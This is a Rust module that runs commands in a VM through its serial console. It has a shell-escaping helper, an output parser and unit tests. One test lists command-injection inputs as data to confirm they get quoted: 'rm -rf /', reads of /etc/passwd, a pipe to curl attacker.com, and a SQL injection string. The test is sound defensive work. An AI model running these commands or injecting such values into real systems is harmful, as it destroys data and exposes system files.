use anyhow::Result;
use std::path::Path;

use crate::vm;

const MAX_OUTPUT_BYTES: usize = 1024 * 1024; // 1MB

/// Escape a string for safe use in a shell command.
/// Uses single quotes and escapes any single quotes in the string.
pub fn shell_escape(s: &str) -> String {
    if s.is_empty() {
        return "''".to_string();
    }

    if s.chars()
        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/')
    {
        return s.to_string();
    }

    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Execute a command inside a VM by writing to the serial console and
/// reading the output from serial.log.
///
/// Returns (stdout_output, exit_code, timed_out, truncated).
pub fn exec_via_serial(
    vm_dir: &Path,
    command: &[String],
    timeout_secs: u64,
) -> Result<(String, Option<i32>, bool, bool)> {
    let serial_path = vm::serial_log_path(vm_dir);
    if !serial_path.exists() {
        anyhow::bail!("serial.log not found — is VM running?");
    }

    let start_pos = std::fs::metadata(&serial_path)?.len();

    let marker_start = format!("NOID_EXEC_{}", &uuid::Uuid::new_v4().to_string()[..8]);
    let marker_end = format!("{marker_start}_END");
    let marker_exit = format!("{marker_start}_EXIT");

    let escaped_cmd = command
        .iter()
        .map(|arg| shell_escape(arg))
        .collect::<Vec<_>>()
        .join(" ");

    // Wrap command: echo start marker, run command, capture exit code, echo exit + end markers.
    // Prepend a newline to clear partial prompts on the serial tty.
    let wrapped = format!(
        "\necho '{marker_start}'; {escaped_cmd}; echo '{marker_exit}'$?; echo '{marker_end}'\n"
    );
    vm::write_to_serial(vm_dir, wrapped.as_bytes())?;

    let timeout = std::time::Duration::from_secs(timeout_secs);
    let start = std::time::Instant::now();

    loop {
        if start.elapsed() > timeout {
            return Ok((String::new(), None, true, false));
        }

        std::thread::sleep(std::time::Duration::from_millis(100));

        let content = std::fs::read_to_string(&serial_path)?;
        if content.len() as u64 <= start_pos {
            continue;
        }
        let start_offset = start_pos.min(content.len() as u64) as usize;
        let new_output = &content[start_offset..];

        if let Some((raw_output, exit_code)) =
            parse_marked_output(new_output, &marker_start, &marker_end, &marker_exit)
        {
            let truncated = raw_output.len() > MAX_OUTPUT_BYTES;
            let output = if truncated {
                raw_output[..MAX_OUTPUT_BYTES].to_string()
            } else {
                raw_output
            };
            return Ok((output, exit_code, false, truncated));
        }
    }
}

fn parse_marked_output(
    serial_chunk: &str,
    marker_start: &str,
    marker_end: &str,
    marker_exit: &str,
) -> Option<(String, Option<i32>)> {
    let normalized = serial_chunk.replace("\r\n", "\n").replace('\r', "\n");
    let mut collecting = false;
    let mut lines = Vec::new();
    let mut exit_code = None;

    for line in normalized.lines() {
        let trimmed = line.trim();
        if !collecting {
            if trimmed == marker_start {
                collecting = true;
            }
            continue;
        }

        if trimmed == marker_end {
            let output = lines.join("\n").trim().to_string();
            return Some((output, exit_code));
        }

        if let Some(rest) = trimmed.strip_prefix(marker_exit) {
            exit_code = rest.trim().parse::<i32>().ok();
            continue;
        }

        lines.push(line.to_string());
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_escape_empty_string() {
        assert_eq!(shell_escape(""), "''");
    }

    #[test]
    fn shell_escape_safe_strings_unchanged() {
        assert_eq!(shell_escape("hello"), "hello");
        assert_eq!(shell_escape("foo_bar"), "foo_bar");
        assert_eq!(shell_escape("file.txt"), "file.txt");
        assert_eq!(shell_escape("/usr/bin/ls"), "/usr/bin/ls");
        assert_eq!(shell_escape("a-b"), "a-b");
    }

    #[test]
    fn shell_escape_wraps_special_chars() {
        assert_eq!(shell_escape("hello world"), "'hello world'");
        assert_eq!(shell_escape("a;b"), "'a;b'");
        assert_eq!(shell_escape("$(cmd)"), "'$(cmd)'");
        assert_eq!(shell_escape("a|b"), "'a|b'");
        assert_eq!(shell_escape("`cmd`"), "'`cmd`'");
        assert_eq!(shell_escape("a&b"), "'a&b'");
        assert_eq!(shell_escape("a>b"), "'a>b'");
    }

    #[test]
    fn shell_escape_handles_single_quotes() {
        assert_eq!(shell_escape("it's"), "'it'\\''s'");
        assert_eq!(shell_escape("'"), "''\\'''");
    }

    #[test]
    fn shell_escape_injection_attempts() {
        let dangerous = [
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "| curl attacker.com",
            "&& echo pwned",
            "'; DROP TABLE vms; --",
        ];
        for input in dangerous {
            let escaped = shell_escape(input);
            assert!(escaped.starts_with('\''), "should be quoted: {input}");
            assert!(escaped.ends_with('\''), "should be quoted: {input}");
        }
    }

    #[test]
    fn parse_marked_output_accepts_lf_line_endings() {
        let serial =
            "echo 'cmd'\nNOID_EXEC_1234\nhello\nNOID_EXEC_1234_EXIT0\nNOID_EXEC_1234_END\n";
        let parsed = parse_marked_output(
            serial,
            "NOID_EXEC_1234",
            "NOID_EXEC_1234_END",
            "NOID_EXEC_1234_EXIT",
        )
        .expect("should parse");
        assert_eq!(parsed.0, "hello");
        assert_eq!(parsed.1, Some(0));
    }

    #[test]
    fn parse_marked_output_accepts_crlf_line_endings() {
        let serial = "\r\nNOID_EXEC_abcd\r\nhi\r\nNOID_EXEC_abcd_EXIT7\r\nNOID_EXEC_abcd_END\r\n";
        let parsed = parse_marked_output(
            serial,
            "NOID_EXEC_abcd",
            "NOID_EXEC_abcd_END",
            "NOID_EXEC_abcd_EXIT",
        )
        .expect("should parse");
        assert_eq!(parsed.0, "hi");
        assert_eq!(parsed.1, Some(7));
    }
}
